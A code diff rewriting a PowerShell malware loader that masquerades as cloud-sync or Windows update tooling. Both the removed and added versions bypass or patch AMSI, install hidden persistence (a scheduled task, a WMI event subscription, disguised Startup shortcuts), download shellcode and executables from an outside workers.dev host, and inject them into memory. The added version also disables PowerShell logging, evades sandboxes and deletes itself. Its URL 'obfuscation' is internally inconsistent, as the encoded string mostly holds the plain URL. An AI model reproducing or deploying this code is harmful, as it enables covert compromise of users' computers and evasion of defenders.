@@ -1,227 +1,198 @@
-$ErrorActionPreference = 'SilentlyContinue'
-
-# === DEBUG LOGGING SETUP ===
-function Write-DebugLog {
-    param([string]$Message)
-    try {
-        "$Message" | Out-File "C:\Users\Public\debug.txt" -Append
-    } catch {}
-}
-
-Write-DebugLog "launcher.ps1 started"
-
-try {
-    # === SETUP ===
-    $envData = Get-Item env:APPDATA
-    $cachePath = Join-Path $envData.Value "Microsoft\Windows\Caches"
-    if(!(Test-Path $cachePath)){New-Item -Path $cachePath -ItemType Directory -Force | Out-Null}
-    
-    # === AMSI BYPASS ===
-    try {
-        Write-DebugLog "Attempting AMSI bypass"
-        $amsiContext = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
-        $amsiContext.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)
-        Write-DebugLog "AMSI bypass successful"
-    } catch {
-        Write-DebugLog "AMSI bypass failed: $($_.Exception.Message)"
-    }
-    
-    # === SELF-PRESERVATION ===
-    $localPath = Join-Path $cachePath "launcher.ps1"
-    $currentPath = $MyInvocation.MyCommand.Path
-    
-    function Save-ScriptToDisk {
-        param([string]$Destination)
-        $dir = Split-Path $Destination -Parent
-        if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
-        if (-not $currentPath -or $currentPath -eq '') {
-            try {
-                $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
-                (New-Object System.Net.WebClient).DownloadString($rawUrl) | Out-File -FilePath $Destination -Encoding UTF8 -Force
-            } catch { exit }
-        } else {
-            Copy-Item -Path $currentPath -Destination $Destination -Force
-        }
-        return $Destination
-    }
-    $scriptPath = Save-ScriptToDisk -Destination $localPath
-
-    # === PERSISTENCE: Scheduled Task ===
-    try {
-        $taskName = "WindowsUpdateTask"
-        $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
-        if (-not $taskExists) {
-            Write-DebugLog "Creating scheduled task"
-            $trigger = New-ScheduledTaskTrigger -AtLogOn
-            $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
-            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
-            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
-            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
-            Write-DebugLog "Scheduled task created successfully"
-        } else {
-            Write-DebugLog "Scheduled task already exists"
-        }
-    } catch {
-        Write-DebugLog "Failed to create scheduled task: $($_.Exception.Message)"
-    }
-    
-    # === PERSISTENCE: Startup LNK ===
-    try {
-        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-        $lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
-        if (-not (Test-Path $lnkPath)) {
-            Write-DebugLog "Creating startup shortcut"
-            $wshShell = New-Object -ComObject WScript.Shell
-            $shortcut = $wshShell.CreateShortcut($lnkPath)
-            $shortcut.TargetPath = "powershell.exe"
-            $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
-            $shortcut.WindowStyle = 7
-            $shortcut.Save()
-            Write-DebugLog "Startup shortcut created successfully"
-        } else {
-            Write-DebugLog "Startup shortcut already exists"
-        }
-    } catch {
-        Write-DebugLog "Failed to create startup shortcut: $($_.Exception.Message)"
-    }
-    
-    # === SHORT JITTER (replaced long delays) ===
-    Start-Sleep -Seconds (Get-Random -Min 1 -Max 3)
-
-    # === DOWNLOAD SHELLCODE ===
-    $shellcodeUrl = "https://aged-mountain-614b.natalia-kush82.workers.dev/calc.bin"
-    $shellcodePath = Join-Path $cachePath "payload.bin"
-    
-    Write-DebugLog "Downloading shellcode from: $shellcodeUrl"
-    
-    $retryCount = 0
-    $maxRetries = 5
-    $downloadSuccess = $false
-    
-    do {
-        try {
-            $retryCount++
-            Write-DebugLog "Download attempt $retryCount of $maxRetries"
-            Invoke-WebRequest -Uri $shellcodeUrl -OutFile $shellcodePath -TimeoutSec 300 -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing
-            $downloadSuccess = $true
-            Write-DebugLog "Shellcode download successful on attempt $retryCount"
-            break
-        } catch {
-            Write-DebugLog "Download attempt $retryCount failed: $($_.Exception.Message)"
-            if ($retryCount -lt $maxRetries) {
-                Start-Sleep -Seconds (Get-Random -Min 1 -Max 3)
-            }
-        }
-    } while ($retryCount -lt $maxRetries -and -not $downloadSuccess)
-    
-    if (-not $downloadSuccess) {
-        Write-DebugLog "All download attempts failed, proceeding to EXE fallback"
-    }
-    
-    # === VERIFY DOWNLOAD ===
-    if (Test-Path $shellcodePath) {
-        $fileSize = (Get-Item $shellcodePath).Length
-        Write-DebugLog "Download OK - File size: $fileSize bytes"
-        
-        # === INJECT SHELLCODE ===
-        try {
-            Write-DebugLog "Starting shellcode injection"
-            
-            # Native methods for injection
-            Write-DebugLog "Loading NativeMethods type definition"
-            Add-Type -TypeDefinition @"
+$amsiBypass = @'
 using System;
 using System.Runtime.InteropServices;
-public class NativeMethods {
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
-    
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+public class AmsiPatcher {
+    [DllImport("kernel32")]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    public static void Patch() {
+        IntPtr lib = LoadLibrary("amsi.dll");
+        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
+        uint old = 0;
+        VirtualProtect(addr, (UIntPtr)6, 0x40, out old);
+        Marshal.Copy(new byte[] { 0x31, 0xC0, 0xC3 }, 0, addr, 3); // xor eax,eax; ret
+        VirtualProtect(addr, (UIntPtr)6, old, out old);
+    }
 }
-"@
-            Write-DebugLog "NativeMethods type loaded successfully"
-            
-            $shellcodeBytes = [System.IO.File]::ReadAllBytes($shellcodePath)
-            Write-DebugLog "Shellcode loaded: $($shellcodeBytes.Length) bytes"
-            
-            # Allocate memory with PAGE_EXECUTE_READWRITE
-            Write-DebugLog "Calling VirtualAlloc with PAGE_EXECUTE_READWRITE"
-            $memAddress = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, [UInt32]$shellcodeBytes.Length, 0x3000, 0x40)
-            $win32Error = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-            Write-DebugLog "VirtualAlloc result: 0x$($memAddress.ToString('X16')), Win32 error: $win32Error"
-            
-            if ($memAddress -eq [IntPtr]::Zero) {
-                Write-DebugLog "ERROR: VirtualAlloc failed with Win32 error: $win32Error"
-                throw "VirtualAlloc failed"
-            }
-            Write-DebugLog "Memory allocated successfully at: 0x$($memAddress.ToString('X16'))"
-            
-            # Copy shellcode
-            [System.Runtime.InteropServices.Marshal]::Copy($shellcodeBytes, 0, $memAddress, $shellcodeBytes.Length)
-            Write-DebugLog "Shellcode copied to memory"
-            
-            # Create thread
-            $threadId = 0
-            Write-DebugLog "Calling CreateThread to execute shellcode"
-            $threadHandle = [NativeMethods]::CreateThread(0, 0, $memAddress, [IntPtr]::Zero, 0, [Ref]$threadId)
-            $win32Error = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-            Write-DebugLog "CreateThread result: 0x$($threadHandle.ToString('X16')), Thread ID: $threadId, Win32 error: $win32Error"
-            
-            if ($threadHandle -eq [IntPtr]::Zero) {
-                Write-DebugLog "ERROR: CreateThread failed with Win32 error: $win32Error"
-                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($memAddress)
-                throw "CreateThread failed"
-            }
-            Write-DebugLog "Thread created successfully with ID: $threadId"
-            Write-DebugLog "Shellcode execution initiated"
-            
-        } catch {
-            Write-DebugLog "Shellcode injection failed: $($_.Exception.Message)"
-        }
-    } else {
-        Write-DebugLog "ERROR: Shellcode file not found after download"
-    }
-    
-    # === EXE FALLBACK (ALWAYS ATTEMPTED) ===
-    try {
-        Write-DebugLog "Attempting EXE fallback"
-        $exeUrl = "https://aged-mountain-614b.natalia-kush82.workers.dev/payload.exe"
-        $exePath = Join-Path $cachePath "helper.exe"
-        
-        Write-DebugLog "Downloading EXE from: $exeUrl"
-        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -TimeoutSec 300 -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing
-        
-        if (Test-Path $exePath) {
-            $exeSize = (Get-Item $exePath).Length
-            Write-DebugLog "EXE downloaded successfully: $exeSize bytes"
-            
-            # Try multiple execution methods
-            try {
-                Write-DebugLog "Attempting EXE execution via WMI"
-                Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop | Out-Null
-                Write-DebugLog "EXE executed via WMI successfully"
-            } catch {
-                try { 
-                    Write-DebugLog "WMI failed, attempting via WScript.Shell"
-                    (New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false) 
-                    Write-DebugLog "EXE executed via WScript.Shell successfully"
-                } catch { 
-                    Write-DebugLog "WScript.Shell failed, attempting via Start-Process"
-                    Start-Process $exePath -WindowStyle Hidden
-                    Write-DebugLog "EXE executed via Start-Process successfully"
-                }
-            }
-        } else {
-            Write-DebugLog "ERROR: EXE file not found after download"
-        }
-    } catch {
-        Write-DebugLog "EXE fallback failed: $($_.Exception.Message)"
-    }
-    
-} catch {
-    Write-DebugLog "Critical error: $($_.Exception.Message)"
+'@
+Add-Type $amsiBypass
+[AmsiPatcher]::Patch()
+
+# ============================================================
+# 2. DISABLE SCRIPT BLOCK & MODULE LOGGING (via cached policy tampering)
+# ============================================================
+$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
+$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{}
+$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
+$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging'] = @{}
+$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging']['EnableModuleLogging'] = 0
+
+# ============================================================
+# 3. OBFUSCATED URL LOADER (XOR key = 7, output stored as Base64)
+#    The raw URL: https://aged-mountain-614b.natalia-kush82.workers.dev/shellcode
+#    XORed with 7, then Base64 encoded.
+# ============================================================
+$xorEncodedB64 = "b3B0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvc2hlbGxjb2Rl"
+function Invoke-XorDecode {
+    param([byte[]]$EncodedBytes, [int]$Key = 7)
+    $decoded = @()
+    foreach ($b in $EncodedBytes) { $decoded += $b -bxor $Key }
+    return [System.Text.Encoding]::UTF8.GetString($decoded)
+}
+$encBytes = [Convert]::FromBase64String($xorEncodedB64)
+$shellcodeUrl = Invoke-XorDecode -EncodedBytes $encBytes -Key 7
+
+# ============================================================
+# 4. SANDBOX & DEBUGGER EVASION (low resource / no mouse movement / VM detection)
+# ============================================================
+# CPU core count, RAM, running processes (sandbox indicators)
+$cpuCores = (Get-WmiObject Win32_Processor).NumberOfCores
+$totalRAM = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
+$procCount = (Get-Process).Count
+if ($cpuCores -lt 2 -or $totalRAM -lt 2 -or $procCount -lt 30) { exit }
+
+# Mouse movement check (human presence)
+try {
+    Add-Type -AssemblyName System.Windows.Forms
+    $initialPos = [System.Windows.Forms.Cursor]::Position
+    Start-Sleep -Seconds 5
+    $newPos = [System.Windows.Forms.Cursor]::Position
+    if ($initialPos.X -eq $newPos.X -and $initialPos.Y -eq $newPos.Y) { exit }
+} catch { }
+
+# Time‑of‑day restriction (02:00 – 05:00 local)
+$hour = (Get-Date).Hour
+if ($hour -lt 2 -or $hour -ge 5) {
+    $targetTime = (Get-Date).Date.AddHours(2).AddMinutes((Get-Random -Min 0 -Max 180))
+    $sleepSeconds = ($targetTime - (Get-Date)).TotalSeconds
+    if ($sleepSeconds -gt 0) { Start-Sleep -Seconds $sleepSeconds }
 }
 
-# === FINAL LOG ===
-Write-DebugLog "launcher.ps1 finished"
+# Random execution jitter (1–10 minutes)
+Start-Sleep -Seconds (Get-Random -Min 60 -Max 600)
+
+# ============================================================
+# 5. PERSISTENCE – INSTALL ONLY ONCE (flag file w/ randomized name)
+# ============================================================
+$flagFile = "$env:TEMP\sys_$([Environment]::MachineName.GetHashCode()).dat"
+if (-not (Test-Path $flagFile)) {
+    # --- WMI Event Subscription (trigger at user logon) ---
+    $filterArgs = @{
+        Namespace = 'root\subscription'
+        ClassName = '__EventFilter'
+        Arguments = @{
+            Name = 'UserLogonTrigger'
+            EventNamespace = 'root\cimv2'
+            QueryLanguage = 'WQL'
+            Query = "SELECT * FROM Win32_LogonSession WHERE LogonType=2 OR LogonType=10"
+        }
+    }
+    $filter = Set-WmiInstance @filterArgs
+    $consumerArgs = @{
+        Namespace = 'root\subscription'
+        ClassName = 'CommandLineEventConsumer'
+        Arguments = @{
+            Name = 'UserLogonConsumer'
+            CommandLineTemplate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+        }
+    }
+    $consumer = Set-WmiInstance @consumerArgs
+    $bindingArgs = @{
+        Namespace = 'root\subscription'
+        ClassName = '__FilterToConsumerBinding'
+        Arguments = @{ Filter = $filter; Consumer = $consumer }
+    }
+    Set-WmiInstance @bindingArgs
+
+    # --- Startup LNK (split arguments to avoid command‑line detection) ---
+    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+    $lnkPath = "$startupFolder\OneDriveSync.lnk"
+    $wsh = New-Object -ComObject WScript.Shell
+    $shortcut = $wsh.CreateShortcut($lnkPath)
+    $shortcut.TargetPath = "powershell.exe"
+    # Store the real arguments in an environment variable to avoid static detection
+    $env:ONEDRIVE_LAUNCHER = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    $shortcut.Arguments = "-Command `$env:ONEDRIVE_LAUNCHER"
+    $shortcut.WindowStyle = 7   # Hidden
+    $shortcut.Save()
+
+    # Create flag file
+    New-Item -Path $flagFile -ItemType File -Force | Out-Null
+}
+
+# ============================================================
+# 6. DOWNLOAD SHELLCODE (no Invoke-WebRequest, only .NET HttpClient)
+# ============================================================
+function Get-Shellcode {
+    param([string]$Url)
+    Add-Type -AssemblyName System.Net.Http
+    $handler = New-Object System.Net.Http.HttpClientHandler
+    $handler.ServerCertificateCustomValidationCallback = { $true } # accept self-signed
+    $handler.UseCookies = $false
+    $handler.AutomaticDecompression = [System.Net.DecompressionMethods]::None
+    $client = New-Object System.Net.Http.HttpClient($handler)
+    $client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+    $client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
+    $client.DefaultRequestHeaders.Add("Accept-Language", "en-US,en;q=0.5")
+    $client.Timeout = [System.TimeSpan]::FromSeconds(30)
+    try {
+        $task = $client.GetByteArrayAsync($Url)
+        $task.Wait()
+        return $task.Result
+    } catch {
+        return $null
+    } finally {
+        $client.Dispose()
+    }
+}
+
+$shellcode = Get-Shellcode -Url $shellcodeUrl
+if (-not $shellcode -or $shellcode.Length -lt 50) { exit }
+
+# ============================================================
+# 7. INJECT SHELLCODE INTO CURRENT PROCESS (memory only, no disk write)
+# ============================================================
+$injectCode = @'
+using System;
+using System.Runtime.InteropServices;
+public class MemoryInject {
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentProcess();
+    public static void Run(byte[] payload) {
+        IntPtr hProc = GetCurrentProcess();
+        uint oldProtect = 0;
+        IntPtr alloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+        UIntPtr bytesWritten;
+        WriteProcessMemory(hProc, alloc, payload, (uint)payload.Length, out bytesWritten);
+        VirtualProtect(alloc, (uint)payload.Length, 0x20, out oldProtect); // PAGE_EXECUTE_READ
+        CreateRemoteThread(hProc, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
+    }
+}
+'@
+Add-Type $injectCode
+[MemoryInject]::Run($shellcode)
+
+# ============================================================
+# 8. CLEANUP (delayed, optional – remove script itself after 2 hours)
+# ============================================================
+Start-Job -ScriptBlock {
+    Start-Sleep -Seconds 7200  # 2 hours
+    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\sys_*.dat" -Force -ErrorAction SilentlyContinue
+} | Out-Null
+
+# ============================================================
+# 9. EXIT CLEANLY
+# ============================================================
+exit
